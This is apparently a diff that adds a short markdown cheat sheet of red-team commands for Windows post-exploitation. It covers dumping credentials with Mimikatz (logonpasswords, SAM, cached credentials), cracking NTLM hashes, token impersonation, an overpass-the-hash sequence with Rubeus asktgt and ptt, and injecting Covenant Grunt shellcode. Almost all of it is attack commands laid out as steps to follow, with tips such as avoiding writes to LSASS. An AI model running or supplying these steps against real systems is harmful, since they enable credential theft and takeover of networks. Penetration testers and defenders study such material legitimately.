@@ -1,0 +1,58 @@
+#Mimikatz or SafetyKatz
+
+Mimikatz sekurlsa::logonpasswords
+
+NTLM + JOHN OR HASCAT
+
+Security Account Manager SAM
+
+Mimikatz token::elevate lsadump::sam
+
+Mimikatz token::elevate lsadump::cache
+
+sekurlsa :: pth its dangerous because write in LSASS alternative use Rubeus
+
+#Token Impersonation
+Local Admin Required
+
+ImpersonateProcess
+ImpersonateUser DOMAIN\user
+Impersonated token RevToSelf
+
+#MakeToken
+Local Admin not Required
+MakeToken user domain pass
+runas.exe /netonly
+
+#Overpass-the-Hash
+Rubeus triage
+Remember LUID
+Rubeus asktgt /user:user /rc4:ntlmhash
+Rubeus asktgt /user:user /ntlm:ntlmhash
+-Copy to base64 and remove spaces
+Find & Replace option (Edit > Replace or Ctrl+H)
+Now make a token
+MakeToken user domain  || because if you used the actual session you will have problems
+Rubeus triage
+Rubeus ptt /ticket:<base64-encoded-ticket>
+Use RevToSelf to revert to the previous logon session (and Rubeus triage to confirm).
+
+#Process Injection
+Covenant Donut
+Grunt shellcode
+ps
+inject
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
